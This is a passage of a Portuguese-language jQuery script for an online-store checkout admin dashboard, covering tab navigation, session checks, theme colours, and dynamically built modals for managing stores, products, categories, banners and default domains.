// const { values } = require("lodash");

// const { indexOf } = require("lodash");

$(document).ready(function () {
    let selectedCategoria = {};
    let selectedAbaUsuario = "checkout";
    let lista_dominio;
    let apagar_dominio = {};
    let objQuill = {};
    let isAdmin = false;
    let isRootUser = false;
    const coresTema = {
        primary: "linear-gradient(310deg, #5e72e4 0%, #5e72e4 100%) !important",
        dark: "linear-gradient(310deg, #344767 0%, #344767 100%) !important",
        info: "linear-gradient(310deg, #11cdef 0%, #11cdef 100%) !important",
        success: "linear-gradient(310deg, #2dce89 0%, #2dce89 100%) !important",
        warning: "linear-gradient(310deg, #fb6340 0%, #fb6340 100%) !important",
        danger: "linear-gradient(310deg, #f5365c 0%, #f5365c 100%) !important",
    };
    let _aba = "dashboard";

    let _global = {
        trocaAba: () => {
            $(".lateral").css("cursor", "pointer");

            $(".lateral").click(function (evt) {
                evt.preventDefault();
                evt.stopPropagation();
                evt.stopImmediatePropagation();

                let abaselecionada = $(evt.currentTarget).attr("aba");

                _aba = abaselecionada;

                if (_aba === "pedidos") {
                    _global.tabelaPedidos();

                    $("#col-step").hide();
                    $("#tbl-heading").text("Pedidos");
                    $("#exporta_pedidos").text("Exportar Pedidos");
                }

                if (_aba === "abandoned_pedidos") {
                    _global.tabelaPedidos(true);

                    $("#col-step").show();
                    $("#tbl-heading").text("Carrinhos Abandonados");
                    $("#exporta_pedidos").text(
                        "Exportar Carrinhos Abandonados"
                    );
                }

                if (_aba === "cartoes") _global.getCartoes();
                if (_aba === "bins") _global.binsCartoes();

                abaselecionada = $(evt.currentTarget);
                $(abaselecionada).children().addClass("active");
                abaselecionada = $(abaselecionada).attr("aba");

                $(".lateral").each((index, data) => {
                    if ($(data).attr("aba") != abaselecionada) {
                        $(data).children().removeClass("active");
                    }

                    let temp =
                        abaselecionada === "abandoned_pedidos"
                            ? "pedidos"
                            : abaselecionada;

                    $("#divmain")
                        .children()
                        .each((index2, data2) => {
                            if ($(data2).attr("id") !== "div" + temp) {
                                $(data2).hide();
                            } else {
                                $(data2).show();
                            }
                        });
                });
                $("#texto_abaatual").text($(".lateral").find(".active").text());
            });
        },
        verificaSessao: async function () {
            return new Promise((res) => {
                $.ajax({
                    url: "statusApi",
                    method: "GET",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization:
                            "Bearer " + _global.dados_usuario.api_token,
                    },
                    success: (retorno, xhr) => {
                        if (retorno.status == 401) {
                            _global.destroiSessao().then(() => {
                                location.href = "/entrar";
                            });
                        }
                        res();
                    },
                    error: (retorno, xhr) => {},
                });
            });
        },
        toast(texto, cor) {
            const _toast = {
                toastsucesso: { tipo: "success", titulo: "Sucesso!" },
                toastwarning: { tipo: "warning", titulo: "Atenção!" },
                toasterro: { tipo: "error", titulo: "Oops..." },
            };
            window.toast({
                title: _toast[cor].titulo,
                message: texto,
                type: _toast[cor].tipo,
                duration: 4000,
            });

            // $("#toast").addClass(cor);
            // setTimeout(() => {
            //     $(".toast-text").text(texto);
            //     $("#divloading").removeClass("bar");
            //     $("#toast").addClass("active");
            //     setTimeout(() => {
            //         $("#toast").removeClass("active");
            //         setTimeout(() => {
            //             $("#toast").removeClass(cor);
            //         }, 500);
            //     }, 3000);
            // }, 500);
        },
        alteraCorTema() {
            const usuario = _global.getUsuario();
            $(".btn_tema").click(function (e) {
                e.preventDefault();
                let tema = $(this).attr("data-color");
                $("#cor_fundo").attr(
                    "style",
                    "background-image: " + coresTema[tema] + ";"
                );

                $(".iconecard").each((i, v) => {
                    console.log("oi");
                    $(v).attr(
                        "style",
                        "background-image: " + coresTema[tema] + ";"
                    );
                });

                $.ajax({
                    url: usuario.url_api + "usuario/updateTema",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    data: {
                        id_usuario: usuario.id_usuario,
                        cor: coresTema[tema],
                    },
                    success: (retorno, xhr) => {
                        $.post(
                            "/dashboard/atualizaCorTema",
                            {
                                cor: coresTema[tema],
                            },
                            (r) => {}
                        );
                    },
                    error: (retorno, xhr) => {},
                });
            });
        },
        usuario: async function () {
            return new Promise((res) => {
                $.ajax({
                    url: "/usuario",
                    success: (retorno) => {
                        _global.dados_usuario = retorno;
                        //admin/root check variable
                        isAdmin = retorno?.tipo_usuario === "pai";
                        isRootUser = retorno?.tipo_usuario === "root";
                        res();
                    },
                });
            });
        },
        getUsuario: () => {
            return _global.dados_usuario;
        },
        loadingAba(aba, carregando = true) {
            if (carregando == true) {
                $('[aba="' + aba + '"]')
                    .children()
                    .append(
                        $("<div>", {
                            style: "margin-left: 35px; width: 16px; height: 16px;",
                            class: "spinner-border text-primary",
                            role: "status",
                            id: `loading_${aba}`,
                        })
                    );
            } else {
                $("#loading_" + aba).remove();
            }
        },
        minhasLojas: () => {
            _global.loadingAba("minhaslojas", true);

            const usuario = _global.getUsuario();
            const pai = $("#rowminhaslojas").parent();
            $("#rowminhaslojas").remove();
            $(pai).append('<div class="row" id="rowminhaslojas"></div>');
            // $("#divmodal_lojas").empty()
            $.ajax({
                url: usuario.url_api + "getLojas",
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Accept: "application/json",
                    Authorization: "Bearer " + usuario.api_token,
                },
                data: {
                    id_usuario: usuario.id_usuario,
                    tipo_usuario: usuario.tipo_usuario,
                    token_checkout: usuario.token_checkout,
                },
                success: (retorno) => {
                    if (retorno.status != 401) {
                        $(retorno).each((index, data) => {
                            $("#divmodal_lojas").append(
                                '<div class="col-md-4">' +
                                    '<div class="modal fade" id="loja_' +
                                    data.id_loja +
                                    '" tabindex="-1" role="dialog" aria-labelledby="exampleModalSignTitle"' +
                                    'aria-hidden="true">' +
                                    '<div class="modal-dialog modal-dialog-centered modal-md" style="min-width: 75%;" role="document">' +
                                    '<div class="modal-content">' +
                                    '<div class="modal-body p-0">' +
                                    '<div class="card card-plain">' +
                                    '<div class="card-header pb-0 text-left">' +
                                    '<div class="nav-wrapper position-relative end-0">' +
                                    '<ul class="nav nav-pills nav-fill p-1" id="pai_modal_' +
                                    data.id_loja +
                                    '" role="tablist">' +
                                    '<li class="nav-item activemodal" aba="dadosloja_' +
                                    data.id_loja +
                                    '">' +
                                    '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' +
                                    data.id_loja +
                                    ' active" aba="dadosloja_' +
                                    data.id_loja +
                                    '" data-bs-toggle="tab"' +
                                    'role="tab" aria-controls="preview" aria-selected="true">' +
                                    '<i class="ni ni-badge text-sm me-2"></i> Dados da Loja' +
                                    "</a>" +
                                    "</li>" +
                                    // '<li class="nav-item abamodalloja_' + data.id_loja + '" aba="pagamento_' + data.id_loja + '">' +
                                    // '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' + data.id_loja + '" aba="pagamento_' + data.id_loja + '" data-bs-toggle="tab" role="tab"' +
                                    // 'aria-controls="code" aria-selected="false">' +
                                    // '<i class="ni ni-laptop text-sm me-2"></i> Pagamento' +
                                    // "</a>" +
                                    // "</li>" +
                                    '<li class="nav-item " aba="produtos_' +
                                    data.id_loja +
                                    '">' +
                                    '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' +
                                    data.id_loja +
                                    '" aba="produtos_' +
                                    data.id_loja +
                                    '" data-bs-toggle="tab" role="tab"' +
                                    'aria-controls="code" aria-selected="false">' +
                                    '<i class="ni ni-app text-sm me-2"></i> Produtos' +
                                    "</a>" +
                                    "</li>" +
                                    '<li class="nav-item " style="display: none;" aba="loja_' +
                                    data.id_loja +
                                    '">' +
                                    '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' +
                                    data.id_loja +
                                    '" aba="loja_' +
                                    data.id_loja +
                                    '" data-bs-toggle="tab" role="tab"' +
                                    'aria-controls="code" aria-selected="false">' +
                                    '<i class="ni ni-shop text-sm me-2"></i> Loja' +
                                    "</a>" +
                                    "</li>" +
                                    // '<li class="nav-item " aba="pixel_' + data.id_loja + '">' +
                                    // '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' + data.id_loja + '" aba="pixel_' + data.id_loja + '" data-bs-toggle="tab" role="tab"' +
                                    // 'aria-controls="code" aria-selected="false">' +
                                    // '<i class="ni ni-laptop text-sm me-2"></i> Pixel' +
                                    // "</a>" +
                                    // "</li>" +
                                    '<li style="display: none;" class="nav-item " aba="banners_' +
                                    data.id_loja +
                                    '">' +
                                    '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' +
                                    data.id_loja +
                                    '" aba="banners_' +
                                    data.id_loja +
                                    '" data-bs-toggle="tab" role="tab"' +
                                    'aria-controls="code" aria-selected="false">' +
                                    '<i class="ni ni-image text-sm me-2"></i> Banners' +
                                    "</a>" +
                                    "</li>" +
                                    // '<li class="nav-item " aba="config_' + data.id_loja + '">' +
                                    // '<a class="nav-link mb-0 px-0 py-1 cursorpointer abamodalloja_' + data.id_loja + '" aba="config_' + data.id_loja + '" data-bs-toggle="tab" role="tab"' +
                                    // 'aria-controls="code" aria-selected="false">' +
                                    // '<i class="ni ni-laptop text-sm me-2"></i> Configurações' +
                                    // "</a>" +
                                    // "</li>" +
                                    "</ul>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="card-body pb-3 flex" id="divdadosloja_' +
                                    data.id_loja +
                                    '">' +
                                    '<div class="widthmodal flex">' +
                                    '<div class="container-fluid">' +
                                    '<div class="row">' +
                                    '<div class="col-lg-12 card" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    '<div class="py-2 flex flex-column width100">' +
                                    "<span>Nome da loja</span>" +
                                    '<input class="form-control" type="text" value="' +
                                    (data.nm_loja == null ? "" : data.nm_loja) +
                                    '"id="nm_loja_' +
                                    data.id_loja +
                                    '">' +
                                    "<span>Logo da Loja</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="img_loja_' +
                                    data.id_loja +
                                    '" >' +
                                    "<span>Cor do Checkout</span>" +
                                    '<input type="color" style="width: 100%;" class="form-control form-control-color" id="cor_loja_' +
                                    data.id_loja +
                                    '" value="' +
                                    (data.cor_loja == undefined ||
                                    data.cor__loja == null
                                        ? "#312edb"
                                        : data.cor_loja) +
                                    '" title="Escolha a Cor">' +
                                    "<span>E-Mail de Rodapé</span>" +
                                    '<input class="form-control" type="text" value="' +
                                    (data.email_loja == null
                                        ? ""
                                        : data.email_loja) +
                                    '"id="email_loja_' +
                                    data.id_loja +
                                    '">' +
                                    "<span>CNPJ de Rodapé</span>" +
                                    '<input class="form-control" type="text" value="' +
                                    (data.cnpj_loja == null
                                        ? ""
                                        : data.cnpj_loja) +
                                    '" id="cnpj_loja_' +
                                    data.id_loja +
                                    '">' +
                                    "<span>Layout do Checkout</span>  " +
                                    '<select class ="form-control" id="tipo_checkout_loja_' +
                                    data.id_loja +
                                    '"></select>' +
                                    "</div>" +
                                    '<div class="divaddloja py-2" style="width: 100%;">' +
                                    '<button class="btn btn-primary" id="btn_salva_' +
                                    data.id_loja +
                                    '" style="width: 100%;">Salvar Informações</button>' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="widthmodal flex" style="width: 40%;justify-content: center;align-items: center;">' +
                                    '<div class="flex" style="display: flex;width: 50%;height: 50%;">' +
                                    '<img class="imgmodal" id="img_modal_' +
                                    data.id_loja +
                                    '" src="http://' +
                                    (data.img_loja != null &&
                                    data.img_loja != undefined
                                        ? data.img_loja
                                        : window.location.host +
                                          "/logo/pergunta.png") +
                                    '" alt="logo"/>' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="card-body pb-3" style="display: none;" id="divpagamento_' +
                                    data.id_loja +
                                    '">' +
                                    "<div>pagamento</div>" +
                                    "</div>" +
                                    '<div class="card-body pb-3 flex" style="display: none;" id="divprodutos_' +
                                    data.id_loja +
                                    '">' +
                                    '<div class="widthmodal flex">' +
                                    '<div class="container-fluid">' +
                                    '<div class="row">' +
                                    '<div class="col-lg-12 card" id="divprodutomodal" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    '<div class="py-2 flex flex-column width100" id="grid_produtos_' +
                                    data.id_loja +
                                    '" style="border: 0px; height: 400px;"></div>' +
                                    '<div id="quill_produtos_loja_' +
                                    data.id_loja +
                                    '" div="produtos_' +
                                    data.id_loja +
                                    '" class="col-lg-6 card flex" style="margin: 5px; display: none; width: 100% !important; height: 100% !important;">' +
                                    '<div id="quill_' +
                                    data.id_loja +
                                    '" style="height: inherit; min-height: inherit;"></div>' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div id="div_adicionar_produto_' +
                                    data.id_loja +
                                    '" class="widthmodal flex" style="width: 40%;">' +
                                    '<div class="container-fluid">' +
                                    '<div class="row">' +
                                    '<div class="col-lg-12 card" style="margin: 5px; justify-content:center;">' +
                                    '<button style="margin-top: 15px;" loja="' +
                                    data.id_loja +
                                    '" id="adiciona_produto_' +
                                    data.id_loja +
                                    '"class="btn btn-primary">Adicionar Produto</button>' +
                                    '<button type="button" style="margin-top: 5px;" id="adiciona_variacao_' +
                                    data.id_loja +
                                    '" class="btn btn-info">Adicionar Variação</button>' +
                                    '<button type="button" style="margin-top: 5px;background: #b412b4;" id="orderbump_' +
                                    data.id_loja +
                                    '" class="btn btn-warning">Order Bump</button>' +
                                    '<button type="button" style="margin-top: 5px;" id="script_' +
                                    data.id_loja +
                                    '" class="btn btn-warning">Script</button>' +
                                    '<button style="margin-top: 5px;" loja="' +
                                    data.id_loja +
                                    '" id="deleta_produto_' +
                                    data.id_loja +
                                    '"class="btn btn-danger">Deletar Produto</button>' +
                                    "</div>" +
                                    '<div class="col-lg-5 card" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    "</div>" +
                                    '<div class="col-lg-12 card" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    "<span>Importar arquivo (.csv)</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="csv_loja_' +
                                    data.id_loja +
                                    '" >' +
                                    '<button style="width: 100%; margin-top: 10px; height: 40px;" class="btn btn-primary" id="importa_csv_loja_' +
                                    data.id_loja +
                                    '">Importar</button>' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="flex card" style="width: 40%; margin: 5px; justify-content: center; align-items: center; display: none;" id="div_variacao_' +
                                    data.id_loja +
                                    '">' +
                                    "</div>" +
                                    '<div id="div_adicionar_produto_form_' +
                                    data.id_loja +
                                    '" class="widthmodal flex" style="display: none; width: 40%;">' +
                                    '<div class="container-fluid">' +
                                    '<div class="row">' +
                                    '<div class="col-lg-12 card" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    '<button class="btn btn-success" style="    margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px;" id="div_voltar_produtos_' +
                                    data.id_loja +
                                    '"><i class="ni ni-bold-left" style="margin: 4px;"></i>Voltar</button>' +
                                    '<div class="flex width100 height100" style="flex-direction: wrap;">' +
                                    '<div class="flex" style="width: 32%; margin-right: 3px; height: 100%¨; flex-direction: column;">' +
                                    "<span>Imagem 1</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_1_' +
                                    data.id_loja +
                                    '" >' +
                                    "</div>" +
                                    '<div class="flex" style="width: 32%; height: 100%¨; flex-direction: column;">' +
                                    "<span>Imagem 2</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_2_' +
                                    data.id_loja +
                                    '" >' +
                                    "</div>" +
                                    '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                    "<span>Imagem 3</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_3_' +
                                    data.id_loja +
                                    '" >' +
                                    "</div>" +
                                    '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                    "<span>Imagem 4</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_4_' +
                                    data.id_loja +
                                    '" >' +
                                    "</div>" +
                                    '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                    "<span>Imagem 5</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_5_' +
                                    data.id_loja +
                                    '" >' +
                                    "</div>" +
                                    '<div class="flex" style="width: 32%; margin-left: 3px; height: 100%¨; flex-direction: column;">' +
                                    "<span>Imagem 6</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="img_produto_6_' +
                                    data.id_loja +
                                    '" >' +
                                    "</div>" +
                                    "</div>" +
                                    '<span style="margin-top: 10px;">Nome do produto</span>' +
                                    '<input class="form-control" placeholder="Nome do produto" id="nome_produto_' +
                                    data.id_loja +
                                    '" >' +
                                    '<span style="margin-top: 10px;">Preço</span>' +
                                    '<input type="number" step="0.01" min="0" max="100000" class="form-control" placeholder="Preço" id="preco_produto_' +
                                    data.id_loja +
                                    '" >' +
                                    '<button style="width: 100%; margin-top: 10px; height: 40px;" class="btn btn-primary" id="add_produto_' +
                                    data.id_loja +
                                    '">Adicionar Produto</button>' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="card-body pb-3" style="display: none;" id="divloja_' +
                                    data.id_loja +
                                    '">' +
                                    '<div class="flex">' +
                                    '<div class="container-fluid">' +
                                    '<div class="row" style="margin-top: 15px;" id="loja_row">' +
                                    '<div class="col-lg-9 flex" id="tab_loja">' +
                                    '<ul class="nav nav-pills nav-fill p-1" tab="produtos_' +
                                    data.id_loja +
                                    '" role="tablist">' +
                                    '<li class="nav-item tab_loja selected_tab_loja" texto="Produtos ativos em sua loja" aba="produtos_' +
                                    data.id_loja +
                                    '">' +
                                    '<a class="nav-link mb-0 px-0 py-1 cursorpointer tab_' +
                                    data.id_loja +
                                    ' active" tab="loja_' +
                                    data.id_loja +
                                    '" data-bs-toggle="tab"' +
                                    'role="tab" aria-controls="preview" aria-selected="true">' +
                                    '<i class="ni ni-badge text-sm me-2"></i> Produtos' +
                                    "</a>" +
                                    "</li>" +
                                    '<li class="nav-item tab_loja" texto="Categorias dos produtos da sua loja" aba="categoria_' +
                                    data.id_loja +
                                    '">' +
                                    '<a class="nav-link mb-0 px-0 py-1 cursorpointer tab_' +
                                    data.id_loja +
                                    ' active" tab="categoria_' +
                                    data.id_loja +
                                    '" data-bs-toggle="tab"' +
                                    'role="tab" aria-controls="preview" aria-selected="true">' +
                                    '<i class="ni ni-badge text-sm me-2"></i> Categorias' +
                                    "</a>" +
                                    "</li>" +
                                    "</ul>" +
                                    '<select style="width: 300px; height: 90%; margin-top: 2px; margin-left: 20px;" id="select_prod_categoria_' +
                                    data.id_loja +
                                    '" class="form-control">' +
                                    '<option value="-1">Selecione um produto</option>' +
                                    "</select>" +
                                    "</div>" +
                                    '<div class="col-lg-3 flex" id="tab_loja" style=" justify-content: end; align-items: center;">' +
                                    '<span id="texto_loja_' +
                                    data.id_loja +
                                    '">Produtos ativos em sua loja</span>' +
                                    "</div>" +
                                    '<div id="div_conteudo_loja"style="display: flex; height: 100%;">' +
                                    '<div  div="categoria_' +
                                    data.id_loja +
                                    '" class="divs_loja_' +
                                    data.id_loja +
                                    ' card col-lg-4 flex" style="display: none;margin: 5px; justify-content:center; align-items: center;">' +
                                    '<span style="align-items: start; margin-top: 10px;">Selecione a Categoria</span>' +
                                    '<select style="width: 75%;" class="form-control" id="categorias_produto_' +
                                    data.id_loja +
                                    '">' +
                                    "</select>" +
                                    '<button id="deleta_categoria_' +
                                    data.id_loja +
                                    '" class="col-lg-4 btn btn-danger" style="width: 75%; height: 40px; margin-bottom: 25px; margin-top: 5px;">Deletar Categoria</button>' +
                                    "</div>" +
                                    '<div  div="categoria_' +
                                    data.id_loja +
                                    '" class="divs_loja_' +
                                    data.id_loja +
                                    ' card col-lg-3 flex" style="display: none;margin: 5px; justify-content:center; align-items: center;">' +
                                    '<span style="margin-top: 10px;">Nome da Categoria</span>' +
                                    '<input style="width: 240px;" id="add_categoria_' +
                                    data.id_loja +
                                    '" type="text" class="form-control">' +
                                    '<button id="btn_categoria_' +
                                    data.id_loja +
                                    '" class="col-lg-4 btn btn-primary" style="width: 240px; height: 40px; margin-bottom: 25px; margin-top: 5px;">Adicionar Categoria</button>' +
                                    "</div>" +
                                    '<div id="grid_produtos_loja_' +
                                    data.id_loja +
                                    '" div="produtos_' +
                                    data.id_loja +
                                    '" class="divs_loja_' +
                                    data.id_loja +
                                    ' col-lg-6 card flex" style="margin: 5px; justify-content:center; width: 100%; height: 400px; align-items: center;">' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="card-body pb-3" style="display: none;" id="divpixel_' +
                                    data.id_loja +
                                    '">' +
                                    '<div class="widthmodal flex">' +
                                    '<div class="container-fluid">' +
                                    '<div class="row">' +
                                    '<div class="col-lg-6 card flex" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    '<button class="btn btn-primary">Adicionar Pixel +</button>' +
                                    '<input type="text"> ' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="card-body pb-3" style="display: none;" id="divbanners_' +
                                    data.id_loja +
                                    '">' +
                                    '<div class="container-fluid">' +
                                    '<div class="row" style="margin-top: 10px;">' +
                                    '<div class="col-lg-3 card flex" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    "<h6>Banner 1</h6>" +
                                    "<span>Banner Desktop</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="banner1_desktop_' +
                                    data.id_loja +
                                    '">' +
                                    "<span>Banner Mobile</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="banner1_mobile_' +
                                    data.id_loja +
                                    '">' +
                                    '<button class="btn btn-primary btnbanner" loja="' +
                                    data.id_loja +
                                    '" banner="1">Adicionar</button>' +
                                    "</div>" +
                                    '<div class="col-lg-3 card flex" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    "<h6>Banner 2</h6>" +
                                    "<span>Banner Desktop</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="banner2_desktop_' +
                                    data.id_loja +
                                    '">' +
                                    "<span>Banner Mobile</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="banner2_mobile_' +
                                    data.id_loja +
                                    '">' +
                                    '<button class="btn btn-primary btnbanner" loja="' +
                                    data.id_loja +
                                    '" banner="2">Adicionar</button>' +
                                    "</div>" +
                                    '<div class="col-lg-3 card flex" style="margin: 5px; justify-content:center; align-items: center;">' +
                                    "<h6>Banner 3</h6>" +
                                    "<span>Banner Desktop</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="banner3_desktop_' +
                                    data.id_loja +
                                    '">' +
                                    "<span>Banner Mobile</span>" +
                                    '<input class="form-control" enctype="multipart/form-data" type="file" id="banner3_mobile_' +
                                    data.id_loja +
                                    '">' +
                                    '<button class="btn btn-primary btnbanner" loja="' +
                                    data.id_loja +
                                    '" banner="3">Adicionar</button>' +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    '<div class="card-body pb-3" style="display: none;" id="divconfig_' +
                                    data.id_loja +
                                    '">' +
                                    "<div>config</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>" +
                                    "</div>"
                            );
                            $("#rowminhaslojas").append(
                                $("<div>", {
                                    class: "col-lg-3 card cardminhaloja",
                                })
                                    .append(
                                        $("<div>", {
                                            class: "divaddloja py-2",
                                            style: "margin-top: 5px;",
                                        })
                                            .append(
                                                $("<h4>", {
                                                    text: data.nm_loja,
                                                })
                                            )
                                            .append(
                                                $("<span>", {
                                                    class: "badge bg-gradient-primary margin5",
                                                    style: "border-radius: 40px;",
                                                    text:
                                                        "ID da Loja (" +
                                                        data.id_loja +
                                                        ")",
                                                })
                                            )
                                            .append(
                                                $("<span>", {
                                                    class: "badge bg-gradient-primary margin5",
                                                    style: "border-radius: 40px;",
                                                    text:
                                                        "Visitas ao checkout (" +
                                                        data.visitas_checkout +
                                                        ")",
                                                })
                                            )
                                            .append(
                                                $("<span>", {
                                                    class: "badge bg-gradient-primary margin5",
                                                    style: "border-radius: 40px;",
                                                    text:
                                                        "Pedidos (" +
                                                        data.pedidos +
                                                        ")",
                                                })
                                            )
                                            .append(
                                                $("<span>", {
                                                    class:
                                                        "badge bg-gradient-" +
                                                        (data.dominio_padrao ==
                                                        null
                                                            ? "danger"
                                                            : "success") +
                                                        " margin5",
                                                    style: "border-radius: 40px;",
                                                    text:
                                                        "Domínio Padrão: " +
                                                        (data.dominio_padrao ==
                                                        null
                                                            ? "N/A"
                                                            : data.dominio_padrao),
                                                })
                                            )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "divaddloja py-2",
                                        })
                                            .append(
                                                $("<button>", {
                                                    style: "border-radius: 30px;",
                                                    id: "btn_loja",
                                                    class: "btn btn-primary width100",
                                                    text: "Alterar Domínio Padrão",
                                                    click: async function (e) {
                                                        const usuario =
                                                            _global.getUsuario();
                                                        let dados =
                                                            await _global.busca(
                                                                "getDominios",
                                                                {
                                                                    id_usuario:
                                                                        usuario.id_usuario,
                                                                },
                                                                "POST"
                                                            );
                                                        let l =
                                                            $(this).attr("i");

                                                        if (
                                                            dados.length < 1 ||
                                                            dados.status == 409
                                                        ) {
                                                            _global.toast(
                                                                "Você não tem domínios cadastrados.",
                                                                "toasterro"
                                                            );
                                                        }

                                                        if (
                                                            dados.status == 500
                                                        ) {
                                                            _global.toast(
                                                                "Erro Interno.",
                                                                "toasterro"
                                                            );
                                                            return;
                                                        }

                                                        $(
                                                            "#body_dominiopadrao"
                                                        ).empty();
                                                        $(
                                                            "#body_dominiopadrao"
                                                        ).append(
                                                            $("<select>", {
                                                                id: "temp_dominiopadrao",
                                                                class: "form-control",
                                                            })
                                                        );
                                                        dados.forEach(
                                                            (v, i) => {
                                                                $(
                                                                    "#temp_dominiopadrao"
                                                                ).append(
                                                                    $(
                                                                        "<option>",
                                                                        {
                                                                            value: v.dominio,
                                                                            text: v.dominio,
                                                                        }
                                                                    )
                                                                );
                                                            }
                                                        );

                                                        $(
                                                            "#footer_dominiopadrao"
                                                        ).empty();
                                                        $(
                                                            "#footer_dominiopadrao"
                                                        ).append(
                                                            $("<button>", {
                                                                class: "btn btn-primary",
                                                                style: "border-radius: 30px;",
                                                                text: "Confirmar",
                                                                click: async function (
                                                                    e
                                                                ) {
                                                                    let dominio =
                                                                        $(
                                                                            "#temp_dominiopadrao"
                                                                        ).val();
                                                                    let l =
                                                                        data.id_loja;

                                                                    if (
                                                                        data.dominio_padrao ==
                                                                        dominio
                                                                    ) {
                                                                        _global.toast(
                                                                            "Este domínio já é o domínio padrão desta loja.",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }

                                                                    if (
                                                                        dominio ==
                                                                        null
                                                                    ) {
                                                                        _global.toast(
                                                                            "Você não selecionou um domínio",
                                                                            "toasterro"
                                                                        );
                                                                        return;
                                                                    }

                                                                    if (
                                                                        l ==
                                                                        null
                                                                    ) {
                                                                        _global.toast(
                                                                            "Erro interno.",
                                                                            "toasterro"
                                                                        );
                                                                        return;
                                                                    }

                                                                    let request =
                                                                        await _global.busca(
                                                                            "dashboard/updateDominioPadrao",
                                                                            {
                                                                                l: l,
                                                                                d: dominio,
                                                                            },
                                                                            "POST"
                                                                        );
                                                                    if (
                                                                        request.status ==
                                                                        200
                                                                    ) {
                                                                        _global.toast(
                                                                            "O domínio foi atrelado à loja com sucesso.",
                                                                            "toastsucesso"
                                                                        );
                                                                        location.reload();
                                                                        return;
                                                                    } else {
                                                                        _global.toast(
                                                                            "Não foi possível salvar.",
                                                                            "toasterro"
                                                                        );
                                                                        return;
                                                                    }
                                                                },
                                                            })
                                                        );

                                                        $(
                                                            "#modaldominiopadrao"
                                                        ).modal("show");
                                                    },
                                                })
                                            )
                                            .append(
                                                $("<button>", {
                                                    style: "border-radius: 30px;",
                                                    id: "btn_loja",
                                                    class: "btn btn-primary width100",
                                                    text: "Administrar Loja",
                                                    "data-bs-target":
                                                        "#loja_" + data.id_loja,
                                                    "data-bs-toggle": "modal",
                                                })
                                            )
                                            .append(
                                                $("<button>", {
                                                    style: "border-radius: 30px;",
                                                    class: "btn btn-danger width100",
                                                    l: data.id_loja,
                                                    text: "Excluir Loja",
                                                    click: async function (e) {
                                                        let l =
                                                            $(this).attr("l");
                                                        let _this = $(this);
                                                        let c = confirm(
                                                            "Você tem certeza? Todos os produtos referentes à loja serão deletados junto com ela."
                                                        );

                                                        if (c) {
                                                            _global.btnCarregando(
                                                                _this,
                                                                true,
                                                                "Excluir Loja"
                                                            );
                                                            let dados =
                                                                await _global.busca(
                                                                    "dashboard/deleteLoja",
                                                                    { l: l },
                                                                    "POST"
                                                                );

                                                            if (
                                                                dados.status ==
                                                                200
                                                            ) {
                                                                _global.toast(
                                                                    "A loja foi excluída com sucesso.",
                                                                    "toastsucesso"
                                                                );
                                                                setTimeout(
                                                                    () => {
                                                                        location.reload();
                                                                    },
                                                                    1500
                                                                );
                                                            } else {
                                                                _global.toast(
                                                                    "Erro interno. [EXC]",
                                                                    "toasterro"
                                                                );
                                                            }
                                                        }
                                                    },
                                                })
                                            )
                                    )
                            );

                            $("#cor_loja_" + data.id_loja)
                                .val(data.cor_loja)
                                .change();
                            $("#tipo_checkout_loja").empty();
